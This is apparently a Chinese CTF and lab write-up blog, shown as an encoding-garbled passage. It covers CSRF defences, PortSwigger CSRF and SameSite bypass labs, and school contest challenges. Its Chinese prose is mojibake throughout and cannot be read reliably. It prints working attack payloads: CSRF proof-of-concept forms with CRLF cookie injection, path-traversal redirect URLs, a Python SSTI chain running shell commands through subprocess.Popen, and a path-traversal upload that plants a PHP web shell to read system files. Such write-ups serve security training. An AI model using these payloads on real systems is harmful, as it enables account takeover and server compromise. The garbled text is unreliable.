ï¼Œç”¨æˆ·æ¯æ¬¡æäº¤æ•°æ®æ—¶éƒ½éœ€è¦åœ¨è¡¨å•ä¸­å¡«å†™éªŒè¯ç ï¼Œè¿™ä¸ªæ–¹æ¡ˆå¤§å¹…åº¦çš„é™ä½CSRFæ”»å‡»ï¼Œä¸€äº›ç®€å•çš„éªŒè¯ç å¯èƒ½ä¼šè¢«hackerç ´è§£ï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒéªŒè¯ç æ˜¯å¾ˆéš¾è¢«ç ´è§£çš„ã€‚ 3ã€éªŒè¯Referer å°±åƒä¸Šé¢çš„Mediumçº§åˆ«é‚£æ ·ï¼Œåœ¨éªŒè¯æ—¶æ·»åŠ ä¸€ä¸ªRefererï¼Œåˆ¤æ–­è¯·æ±‚çš„æ¥æºåœ°å€æ˜¯å¦æ˜¯å½“å‰ç½‘é¡µï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å¯ä»¥è®¤ä¸ºè¯¥è¯·æ±‚æ˜¯åˆæ³•çš„ï¼Œå¦åˆ™å°±æ‹’ç»ç”¨æˆ·è¯·æ±‚ã€‚ 4ã€Anti CSRF Token CSRFæ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºæ”»å‡»è€…å¯ä»¥ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸­æ‰€æœ‰çš„ç”¨æˆ·éªŒè¯ä¿¡æ¯éƒ½å­˜åœ¨äºcookieä¸­ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ç”¨æˆ·éªŒè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ç›´æ¥åˆ©ç”¨ç”¨æˆ·çš„cookieæ¥é€šè¿‡å®‰å…¨éªŒè¯ã€‚ç”±æ­¤å¯çŸ¥ï¼ŒæŠµå¾¡CSRFæ”»å‡»çš„å…³é”®åœ¨äºï¼šåœ¨è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ€»ä¸å­˜åœ¨äºcookieä¹‹ä¸­ã€‚ åœ¨å¼€å‘è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡ç«¯è¿›è¡Œtokenæ ¡éªŒï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºæ˜¯CSRFæ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ bpâ€™s labLabï¼šæ²¡æœ‰é˜²å¾¡æªæ–½çš„ CSRF æ¼æ´é¢˜ç›®æç¤ºç”µå­é‚®ä»¶æ›´æ”¹åŠŸèƒ½å®¹æ˜“å—åˆ° CSRF çš„æ”»å‡» æ‰€ä»¥æˆ‘ä»¬ç™»å½•è´¦å·ä¹‹åè½¬åˆ°ç”µå­é‚®ä»¶æ›´æ”¹ç•Œé¢ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå°†å…¶å‘é€åˆ°é‡æ”¾å™¨ä¸­ å¯ä»¥çœ‹åˆ°æŠ¥å¤´ä¸­æœ‰refererï¼Œæˆ‘ä»¬å°è¯•åˆ é™¤å¹¶å†æ¬¡å‘é€æŸ¥çœ‹å›æ˜¾ï¼Œå‘ç°ä¸€åˆ‡æ­£å¸¸ï¼Œè¯´æ˜åç«¯å¹¶æ²¡æœ‰éªŒè¯referer å­˜åœ¨csrfæ¼æ´ï¼Œå³é”®ç”Ÿæˆpocï¼Œå¤åˆ¶htmlåˆ°bpçš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œå¯ä»¥è‡ªå·±å…ˆæµ‹è¯•ä¸€ä¸‹ï¼Œä½†å®Œæˆæµ‹è¯•åè¦æ”¹ä¸€ä¸‹é‚®ç®±åœ°å€ï¼Œå‘é€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šä»¤ç‰ŒéªŒè¯å–å†³äºè¯·æ±‚æ–¹æ³•çš„ CSRFä¾æ—§æ˜¯ç”µå­é‚®ä»¶æ›´æ–°åŠŸèƒ½å®¹æ˜“å—åˆ°æ”»å‡» ç™»å½•è´¦å·ä¹‹åè½¬åˆ°ç”µå­é‚®ä»¶æ›´æ”¹ç•Œé¢ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå°†å…¶å‘é€åˆ°é‡æ”¾å™¨ä¸­ è¿™æ¬¡æœ‰ä»¤ç‰Œè¿›è¡ŒéªŒè¯ï¼Œå¦‚ä¸‹ï¼š å°è¯•ç›´æ¥ä¿®æ”¹ä»¤ç‰Œå€¼ï¼Œå¤±è´¥ï¼Œæ›´æ”¹é‚®ç®±è¯·æ±‚è¢«æ‹’ç» æ ‡é¢˜ï¼šä»¤ç‰ŒéªŒè¯å–å†³äºè¯·æ±‚æ–¹æ³•çš„ CSRFï¼Œç»™äº†æˆ‘ä»¬å¦ä¸€ç§æ€è·¯ æˆ‘ä»¬å°è¯•å³é”®æ›´æ”¹è¯·æ±‚æ–¹å¼ä¸ºgetï¼Œç„¶åå¯¹ä»¤ç‰Œå€¼è¿›è¡Œéšæ„ä¿®æ”¹ï¼Œè¯·æ±‚æˆåŠŸï¼Œè¯´æ˜æ›´æ”¹è¯·æ±‚æ–¹å¼ååç«¯æ²¡æœ‰éªŒè¯ä»¤ç‰Œå€¼ æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”Ÿæˆpocï¼Œå¤åˆ¶htmlåˆ°bpçš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œé€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šCSRFï¼Œå…¶ä¸­ä»¤ç‰ŒéªŒè¯å–å†³äºä»¤ç‰Œçš„å­˜åœ¨ä¾æ—§æ˜¯ç”µå­é‚®ä»¶æ›´æ–°åŠŸèƒ½å®¹æ˜“å—åˆ°æ”»å‡» ç™»å½•è´¦å·ä¹‹åè½¬åˆ°ç”µå­é‚®ä»¶æ›´æ”¹ç•Œé¢ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå°†å…¶å‘é€åˆ°é‡æ”¾å™¨ä¸­ æœ‰ä»¤ç‰ŒéªŒè¯ï¼Œä½†æ˜¯æ ¹æ®æ ‡é¢˜ä¸­çš„ä»¤ç‰ŒéªŒè¯å–å†³äºä»¤ç‰Œçš„å­˜åœ¨è¿™å¥è¯ï¼Œå°è¯•ç›´æ¥æŠŠä»¤ç‰Œå…¨éƒ¨åˆ é™¤ï¼Œå‘é€è¯·æ±‚æˆåŠŸ äºæ˜¯ç›´æ¥ç”ŸæˆPocï¼Œå¤åˆ¶htmlåˆ°bpçš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œé€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šä»¤ç‰Œä¸ç”¨æˆ·ä¼šè¯æ— å…³çš„ CSRFæ­¤å®éªŒå®¤çš„ç”µå­é‚®ä»¶æ›´æ”¹åŠŸèƒ½å®¹æ˜“å—åˆ° CSRF çš„æ”»å‡»ã€‚å®ƒä½¿ç”¨ä»¤ç‰Œæ¥å°è¯•é˜²æ­¢ CSRF æ”»å‡»ï¼Œä½†å®ƒä»¬æ²¡æœ‰é›†æˆåˆ°ç«™ç‚¹çš„ä¼šè¯å¤„ç†ç³»ç»Ÿä¸­ è¿™æ¬¡æˆ‘ä»¬æ‹¥æœ‰ä¸¤ä¸ªè´¦å·ï¼Œé¦–å…ˆç™»å½•ä¸€ä¸ªè´¦å·å¹¶æŠ“åŒ…ï¼Œè¿™æ¬¡çš„ä»¤ç‰Œæ—¢ä¸èƒ½ä¿®æ”¹ï¼Œåˆ é™¤åä¹Ÿæ²¡æœ‰èµ·åˆ°ä»»ä½•ä½œç”¨ï¼Œæ›´æ”¹è¯·æ±‚æ–¹å¼ä¹Ÿä¸è¡Œ æŸ¥çœ‹ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­çš„/my-account?id=wienerï¼Œæ£€æŸ¥åå‘ç°tokenå€¼æ˜¯åœ¨è¯¥æ¡ç›®ä¸­ç”Ÿæˆçš„ï¼Œå…·ä½“ä»£ç ä¸ºï¼š input required type=hidden name=csrf value=MwT3m0JuawJpnibLHLd4XDpvLMw9GMWx äºæ˜¯æˆ‘ä»¬æŠŠè¿™ä¸ªtokenå€¼å¤åˆ¶åˆ°å¦ä¸€ä¸ªè´¦å·çš„ä¿®æ”¹é‚®ç®±çš„æŠ“åŒ…ç•Œé¢ä¸­æ›¿æ¢ä¸€ä¸‹ï¼Œç‚¹å‡»å‘é€ï¼Œè¯·æ±‚æˆåŠŸ è¿™è¯´æ˜äº†åç«¯åªæ£€æŸ¥ä»¤ç‰Œæ˜¯å¦æ­£ç¡®ï¼Œæ²¡æœ‰æ£€æŸ¥ä»¤ç‰Œçš„æ¥æºæ˜¯å¦æ˜¯è¯¥ç”¨æˆ· äºæ˜¯æˆ‘ä»¬å¯ä»¥ç”Ÿæˆpocï¼Œå¤åˆ¶htmlåˆ°bpçš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­ï¼Œéœ€è¦æ³¨æ„ï¼Œtokenä¸€æ—¦è¢«ä½¿ç”¨è¿‡ä¾¿ä¸ä¼šå†å‘æŒ¥ä½œç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä»æ¥æ²¡æœ‰è¢«ç”¨è¿‡çš„ä»¤ç‰Œ é‡æ–°æŠŠæ›´æ”¹é‚®ç®±çš„é¡µé¢å†åŠ è½½ä¸€ä¸‹ï¼ŒæŠ“ä¸‹åŒ…ï¼Œè·å¾—æ–°çš„tokenå€¼ï¼Œè¿™æ—¶è¦æ³¨æ„ä¸èƒ½æŠŠè¯¥è¯·æ±‚æ”¾è¡Œï¼Œå°±æŠŠå®ƒæŒ‚åœ¨é‚£è¾¹å°±å¥½äº†ï¼Œç„¶åæŠŠå¾—åˆ°çš„æ–°çš„ä»¤ç‰Œå€¼å¤åˆ¶åˆ°ä»£ç é‡Œé¢ï¼Œå­˜å‚¨åå‘é€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šä»¤ç‰Œç»‘å®šåˆ°éä¼šè¯ Cookie çš„ CSRFhtml !-- CSRF PoC - generated by Burp Suite Professional -- body form action=https://0a0000880458d70780af219200c400fa.web-security-academy.net/my-account/change-email method=POST input type=hidden name=email value=123456#64;123 / input type=hidden name=csrf value=dxpxBVZLqU1g14UUD2dv4omHuDneB7yH / input type=submit value=Submit request / /form img src=https://0a0000880458d70780af219200c400fa.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ZfUOIWcnpwgpxoFwNzvS9oeXgQxA03PJ%3b%20SameSite=None onerror=document.forms[0].submit() /body/html Labï¼šåœ¨ cookie ä¸­å¤åˆ¶ä»¤ç‰Œçš„ CSRFæ­¤å®éªŒå®¤çš„ç”µå­é‚®ä»¶æ›´æ”¹åŠŸèƒ½å®¹æ˜“å—åˆ° CSRF çš„æ”»å‡»ã€‚å®ƒå°è¯•ä½¿ç”¨ä¸å®‰å…¨çš„â€œåŒé‡æäº¤â€CSRF é¢„é˜²æŠ€æœ¯ã€‚ æˆ‘ä»¬ç™»å½•è´¦å·åæ›´æ–°é‚®ç®±ï¼ŒæŠ“åŒ…ï¼Œå¦‚ä¸‹ï¼š å¯ä»¥å‘ç°Cookieä¸­çš„csrfå’Œä¼ å‚ä¸­çš„csrfæ˜¯ä¸€æ ·çš„ï¼Œè§‚å¯Ÿ åˆ°csrf body å‚æ•°çš„å€¼æ˜¯é€šè¿‡å…¶ä¸ csrf cookie è¿›è¡Œæ¯”è¾ƒæ¥éªŒè¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦è¿™ä¸¤ä¸ªcsrfçš„å€¼ä¸€æ ·ä¾¿å¯ä»¥æˆåŠŸç»•è¿‡ è¿”å›ä¸»é¡µæ‰§è¡Œæœç´¢åŠŸèƒ½ï¼Œåˆ°ä»£ç†ä¸­çš„HTTPå†å²è®°å½•ä¸­æ‰¾åˆ°è¯¥æ¡ç›®ï¼Œå‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œå‘é€è¯·æ±‚ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š å‘ç°æœç´¢è¯åæ˜ åœ¨ Set-Cookie æ ‡å¤´ä¸­ã€‚ç”±äºæœç´¢åŠŸèƒ½æ²¡æœ‰ CSRF ä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨å®ƒå‘å—å®³è€…ç”¨æˆ·çš„æµè§ˆå™¨æ³¨å…¥ cookie æ¯”å¦‚ï¼š/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=Noneï¼ˆæœ‰æ¶‰åŠåˆ°xssï¼‰ å…¶ä¸­çš„ SameSiteNoneï¼šåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨åœ¨è·¨ç«™è¯·æ±‚ï¼ˆä¾‹å¦‚ä»ä¸€ä¸ªç½‘ç«™å‘å¦ä¸€ä¸ªç½‘ç«™å‘é€è¯·æ±‚ï¼‰æ—¶ä¸ä¼šå‘é€ç¬¬ä¸‰æ–¹Cookieã€‚è¿™æ˜¯æµè§ˆå™¨çš„åŒæºç­–ç•¥çš„ä¸€éƒ¨åˆ†ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»å’Œå…¶ä»–å®‰å…¨å¨èƒã€‚ç„¶è€Œï¼Œæœ‰æ—¶å€™æˆ‘ä»¬ç¡®å®éœ€è¦åœ¨è·¨ç«™è¯·æ±‚æ—¶å‘é€Cookieï¼Œæ¯”å¦‚åœ¨ä½¿ç”¨å•ç‚¹ç™»å½•ï¼ˆSingle Sign-Onï¼‰æˆ–è€…åµŒå…¥å…¶ä»–ç½‘ç«™çš„èµ„æºï¼ˆä¾‹å¦‚å›¾ç‰‡æˆ–iframeï¼‰æ—¶ã€‚è¿™å°±éœ€è¦ä½¿ç”¨SameSiteNoneå±æ€§æ¥è§£é™¤æµè§ˆå™¨çš„é™åˆ¶ã€‚å½“è®¾ç½®äº†SameSiteNoneå±æ€§æ—¶ï¼Œè¡¨ç¤ºè¯¥Cookieå¯ä»¥åœ¨è·¨ç«™è¯·æ±‚ä¸­å‘é€ äºæ˜¯æˆ‘ä»¬æ„é€ pocå¦‚ä¸‹ï¼š html !-- CSRF PoC - generated by Burp Suite Professional -- body form action=https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/my-account/change-email method=POST input type=hidden name=email value=123456#64;123 / input type=hidden name=csrf value=fake / input type=submit value=Submit request / /form img src=https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None onerror=document.forms[0].submit();/ /body/html ä¿å­˜ï¼Œå°†å…¶å‘é€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šé€šè¿‡æ–¹æ³•è¦†ç›–ç»•è¿‡ SameSite Laxåœ¨æ›´æ”¹é‚®ç®±åœ°å€ç•Œé¢æŠ“åŒ…ï¼ŒæŠŠæŠ“åˆ°çš„å‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œå‘é€ï¼Œå¾—åˆ°çš„å“åº”å¤´ä¸­æœ‰ä¸€æ¡ä¸ºï¼šX-Frame-Options: SAMEORIGINè¿™è¯´æ˜äº†å…è®¸è¯¥é¡µé¢åœ¨ç›¸åŒæºï¼ˆå³ç›¸åŒåŸŸåï¼‰çš„ frameã€iframe æˆ–è€… object æ ‡ç­¾ä¸­åŠ è½½ é™¤æ­¤ä¹‹å¤–ä¹Ÿæ²¡æœ‰ä»»ä½•çš„ä»¤ç‰Œæ¥é™åˆ¶ æŸ¥çœ‹å“åº”å‘ç°ç½‘ç«™åœ¨è®¾ç½®ä¼šè¯ cookie æ—¶æ²¡æœ‰æ˜ç¡®æŒ‡å®šä»»ä½• SameSite é™åˆ¶ã€‚å› æ­¤ï¼Œæµè§ˆå™¨å°†ä½¿ç”¨é»˜è®¤çš„ Lax é™åˆ¶çº§åˆ«ï¼Œè¿™æ„å‘³ç€ä¼šè¯ cookie å°†åœ¨è·¨ç«™ç‚¹ GET è¯·æ±‚ä¸­å‘é€ï¼Œåªè¦å®ƒä»¬æ¶‰åŠé¡¶çº§å¯¼èˆª é¡¶çº§å¯¼èˆªï¼šæŒ‡çš„æ˜¯æµè§ˆå™¨çš„åœ°å€æ å¯¼èˆªï¼Œå³åœ¨æµè§ˆå™¨çš„åœ°å€æ è¾“å…¥ç½‘å€å¹¶æŒ‰ä¸‹å›è½¦ï¼Œæˆ–è€…é€šè¿‡ç‚¹å‡»é“¾æ¥è¿›è¡Œçš„é¡µé¢è·³è½¬ï¼Œè¿™ç§è·³è½¬ä¼šæ”¹å˜æµè§ˆå™¨çš„é¡¶çº§çª—å£å†…å®¹ äºæ˜¯æˆ‘ä»¬å°è¯•æ›´æ”¹è¯·æ±‚æ–¹å¼ä¸ºgetï¼Œç„¶åå‘é€ï¼Œå›æ˜¾è¡¨ç¤ºè¯¥é¡µé¢åªå…è®¸postä¼ å‚ å‘getä¼ å‚ä¸­æ·»åŠ  _method=POSTï¼šç”¨äºåœ¨HTMLè¡¨å•ä¸æ”¯æŒçš„æƒ…å†µä¸‹æ¨¡æ‹ŸPUTã€DELETEç­‰HTTPæ–¹æ³•ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸åœ¨RESTfulé£æ ¼çš„Webåº”ç”¨ä¸­ä½¿ç”¨ï¼Œä»¥ç»•è¿‡æµè§ˆå™¨å’ŒHTMLè¡¨å•çš„é™åˆ¶ å†æ¬¡å‘é€ï¼ŒæˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­è¾“å…¥å¦‚ä¸‹ä»£ç  scriptdocument.location=https://0a77000403d1fecd80be4987002a0052.web-security-academy.net/my-account/change-email?email=1236%40123_method=POST/script ä¿å­˜å¹¶å‘é€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šé€šè¿‡å®¢æˆ·ç«¯é‡å®šå‘ç»•è¿‡ SameSite Stricté¦–å…ˆåœ¨æ›´æ”¹ç”µå­é‚®ç®±çš„ç•Œé¢æŠ“åŒ…ï¼ŒæŠŠæŠ“åˆ°çš„å‘é€åˆ°é‡æ”¾å™¨ä¸­ å‘é€ï¼Œå¾—åˆ°çš„å“åº”å¤´ä¸­æœ‰ä¸€æ¡ä¸ºï¼šX-Frame-Options: SAMEORIGIN å°è¯•æ›´æ”¹è¯·æ±‚æ–¹å¼ä¸ºgetï¼Œç„¶åå‘é€ï¼Œå›æ˜¾è¯´æ˜ä¿®æ”¹ç”µå­é‚®ç®±æˆåŠŸï¼Œæ— éœ€å…¶ä»–æ“ä½œä¾¿å¯ä»¥æˆåŠŸä¿®æ”¹ï¼Œå½“æ—¶ä»¥ä¸ºå·²ç»æˆåŠŸäº†ï¼Œç›´æ¥å»æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­å†™ä»£ç ï¼Œå‘é€ç»™å—å®³è€…ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œè¡¨æ˜ç›´æ¥è¿™æ ·ä¿®æ”¹çš„è¯æ˜¯è¡Œä¸é€šçš„ å›åˆ°ä¸»é¡µä¸Šè¿›å…¥ä»»æ„ä¸€ç¯‡åšå®¢ä¸­è¿›è¡Œè¯„è®ºï¼Œç„¶åæŸ¥çœ‹bpçš„ä»£ç†æ¨¡å—ä¸­çš„HTTPå†å²è®°å½•ï¼ŒæŸ¥çœ‹äº† /post/comment/confirmation?postId=2ï¼Œå…¶å“åº”ä¸­æœ‰å¥½ä¸œè¥¿å¦‚ä¸‹ï¼š äºæ˜¯æˆ‘ä»¬è½¬å»æŸ¥çœ‹æ¡ç›®/resources/js/commentConfirmationRedirect.jsï¼Œæ‰€éœ€å‡½æ•°å¦‚ä¸‹ï¼š redirectOnConfirmation = (blogPath) = setTimeout(() = const url = new URL(window.location); const postId = url.searchParams.get(postId); window.location = blogPath + / + postId; , 3000); æ˜“å¾—è¿™æ˜¯ä¸€ä¸ªå¯ä»¥é‡å®šå‘é¡µé¢çš„å‡½æ•°ï¼Œä¸Šé¢çš„ blogPathä¸º/postï¼ŒpostIdä¸º2ï¼Œäºæ˜¯ä¼šé‡å®šå‘åˆ°ç›¸å…³çš„é¡µé¢ æ ¹æ®è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°ç›®å½•ç©¿è¶Šï¼Œäºæ˜¯è¿›è¡Œå°è¯•ï¼š/post/comment/confirmation?postId=../../../my-accountï¼ŒæˆåŠŸé‡å®šå‘åˆ°è¯¥ç•Œé¢ï¼Œæ¥ç€å°è¯•ï¼š/post/comment/confirmation?postId=../../../my-account/change-email?email=admin%40145623%26submit=1ï¼ˆç‰¹æ®Šå­—ç¬¦è®°å¾—ç¼–ç ï¼‰ï¼ŒæˆåŠŸä¿®æ”¹é‚®ç®± äºæ˜¯åœ¨æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ä¸­å¯ä»¥å†™å‡ºå¦‚ä¸‹ä»£ç ï¼š script document.location = https://0acd0042033dadfd81f92ff80050003c.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1;/script ä¿å­˜ï¼Œå‘é€ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³","tags":["csrf"],"categories":["CTF"]},{"title":"æ ¡èµ›é¢˜è§£","path":"/2024/04/06/æ ¡èµ›é¢˜è§£/","content":"Miscå…ˆæ¥ç­¾ä¸ªåˆ°å§ç‚¹å‡»é“¾æ¥ï¼Œç™¾åº¦ç½‘ç›˜æå–ï¼Œçœ‹è§†é¢‘ çœ‹åˆ°è¦åˆ°ä¸€åŠçš„æ—¶å€™ä¼šçªç„¶é—ªè¿‡ä¸€ä¸ªäºŒç»´ç ï¼Œäºæ˜¯å°±æ˜¯è§æ‰‹é€Ÿçš„æ—¶å€™äº†ï¼Œåœ¨è¿™å‡ ç§’ç–¯ç‹‚ç–¯ç‹‚æš‚åœï¼Œæœ€ç»ˆæš‚åœåˆ°äº†äºŒç»´ç å¤„ï¼Œæ‰«ç å¾—åˆ°flag çˆ¬å±±ç»™äº†ä¸€å¼ å›¾ç‰‡ æ‰“å¼€kaliï¼Œåœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼šexiftool å›¾ç‰‡åï¼Œå¾—åˆ°å›¾ç‰‡çš„å…·ä½“ä¿¡æ¯ï¼Œæœ€åå‡ è¡Œæ˜¯æ‹æ‘„çš„ç»çº¬åº¦ï¼š24 deg 30 17.30 Nï¼›118 deg 3 20.03 Eï¼Œæ‹¿ç»™gptç¨ä¿®ä¸€ä¸‹å¾—åˆ°ï¼š24Â°3017N 118Â°320Eï¼ŒæŠŠè¯¥åæ ‡æ‹¿åˆ°è°·æ­Œåœ°çƒä¸­æœç´¢ä¸€ä¸‹ï¼Œå‘ç°ä½äºå¦é—¨å¸‚æµ·æ²§åŒºçš„ä¸€ä¸ªå…¬å›­é™„è¿‘ï¼Œå·²çŸ¥å°æ¶‚æ˜¯å°å­¦ç”Ÿï¼Œä¸Šçš„æ˜¯å°å­¦ï¼Œå¼€å§‹ç¤¾å·¥ï¼Œå¯åŠ¨é«˜å¾·åœ°å›¾ï¼Œæœç´¢æµ·æ²§åŒºå°å­¦ï¼ŒæŠŠæœç´¢åˆ°çš„å°å­¦åä¸€ä¸ªä¸ªè¾“è¿›å»ï¼Œæœ€åå¾—åˆ°æ˜¯å¤©å ‚å±±å°å­¦ webezzzzzzzzz_PTAè¿›å…¥ç¯å¢ƒå‘ç°è¦è®©æˆ‘ä»¬å†™pythonä»£ç ï¼Œç›²çŒœsstiæ¼æ´ å¼€å§‹æµ‹è¯•ï¼Œé¦–å…ˆè¾“å…¥ print([].__class__.__base__.__subclasses__())å¾—åˆ°æ‰€æœ‰çš„å­ç±»ï¼Œç„¶åå‘ç°æˆ‘è¦ä½¿ç”¨çš„class subprocess.Popenä½äºæœ€åä¸€ä¸ª507ï¼Œäºæ˜¯æˆ‘ä»¬è¾“å…¥payloadï¼š[].__class__.__base__.__subclasses__()[507](ls /,shell=True,stdout=-1).communicate()[0].strip() å‘ç°flagä½äºæ ¹ç›®å½•å¤„ï¼Œç»§ç»­ [].__class__.__base__.__subclasses__()[507](cat /flag,shell=True,stdout=-1).communicate()[0].strip()å¾—åˆ°flag Potato_Netdiskä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°æºç ï¼Œæœ€å¼€å§‹æ˜¯æŸ¥çœ‹fileUpload.phpï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ é‚£è¾¹ä½¿åŠ²å°è¯•ç›®å½•ç©¿è¶Šï¼Œä¹Ÿå°†..è¿›è¡Œç¼–ç åè¿›è¡Œä¸Šä¼ ï¼Œä½†æ— è®ºæ€æ ·æ“ä½œè¿˜æ˜¯ä¸è¡Œï¼Œæƒ³ç€æ–‡ä»¶ä¼šå…ˆå­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­ /tmp/uploadä¸‹é¢ï¼Œtmpç›®å½•ä½äºæ ¹ç›®å½•å¤„ï¼Œå½“æ—¶æƒ³ç€ä¸´æ—¶å­˜å‚¨å’Œåˆ æ‰æ–‡ä»¶ä¹‹é—´ä¼šæœ‰ä¸€å®šçš„æ—¶é—´ï¼Œæƒ³ç€æ¡ä»¶ç«äº‰è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯å¤±è´¥äº† ä¹‹åæŸ¥çœ‹dirUpload.phpæ–‡ä»¶ï¼Œå‘ç°äº†ä»¥ä¸‹ä»£ç ï¼š function validateFilePath($path): void if(str_contains($path,...DIRECTORY_SEPARATOR) || str_contains($path,/var/www/html)) http_response_code(403); die(éæ³•ä¸Šä¼ è·¯å¾„ï¼.br.$path); function normalizeFilePath($path): string if(strpos($_SERVER[HTTP_USER_AGENT], Windows)) return str_replace(\\\\,/,$path); return $path; ä»¥åŠ if($_SERVER[REQUEST_METHOD] === POST) foreach ($_FILES[file][tmp_name] as $key = $tmp_name) $dest = UPLOAD_DIR.$_FILES[file][full_path][$key]; validateFilePath($dest); uploadFile($tmp_name, normalizeFilePath($dest)); ä¸Šä¼ çš„æ–‡ä»¶å¤¹æ˜¯å…ˆæ£€æµ‹æ˜¯å¦æœ‰éæ³•è·¯å¾„ç„¶åå†æŠŠ \\æ”¹æˆ /ï¼Œæ£€æµ‹çš„å‡½æ•°ç”¨çš„æ˜¯str_containsï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æœ‰è¿™æ ·çš„ç»•è¿‡ï¼Œç”¨bpæŠ“åŒ…ï¼ŒæŠŠä¸Šä¼ çš„æ–‡ä»¶åæ”¹ä¸º..\\..\\..\\..\\var\\www\\html\\shel.phpï¼Œä¸Šä¼ æˆåŠŸï¼Œæ–‡ä»¶å†…å®¹ä¸º?php system(ls /);? ç”±äºæˆ‘ä»¬è®¿é—®http://121.43.34.239:20017/index.phpï¼Œå°±ç›¸å½“äºè®¿é—®/var/www/html/index.phpï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶å°±æ˜¯è¦è®¿é—®http://121.43.34.239:20017/shell.phpï¼Œå¾—åˆ°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ¥ç€æŠŠæ–‡ä»¶å†…å®¹æ”¹ä¸º?php system(cat /flag);?ï¼Œå¾—åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„flag Potato_Netdisk_v2.0æœ‰äº†ä¸Šé¢˜çš„ç»éªŒï¼Œè¿™é¢˜æˆ‘ä»¬ç›´æ¥çœ‹dirUpload.phpï¼Œå‘ç°äº†ä¸ç¬¬ä¸€é¢˜ä¸ä¸€æ ·çš„åœ°æ–¹ï¼Œå¦‚ä¸‹ï¼š function validateFilePath($path): void if(str_contains($path,...DIRECTORY_SEPARATOR) || preg_match(/var.www.html/,$path)) http_response_code(403); die(éæ³•ä¸Šä¼ è·¯å¾„ï¼.br.$path); å‘ç°äº†preg_match(/var.www.html/,$path)ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„.è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šä¸€é¢˜çš„æ€è·¯ç»•è¿‡çš„è¯æ˜¯è¡Œä¸é€šçš„ï¼Œç„¶åæƒ³åˆ°äº†å¯ä»¥é€šè¿‡é€šé…ç¬¦æ¥è¿›è¡Œç»•è¿‡ï¼Œé¡µé¢æ˜¯ä¼šæ˜¾ç¤ºæ–‡ä»¶æˆåŠŸä¸Šä¼ 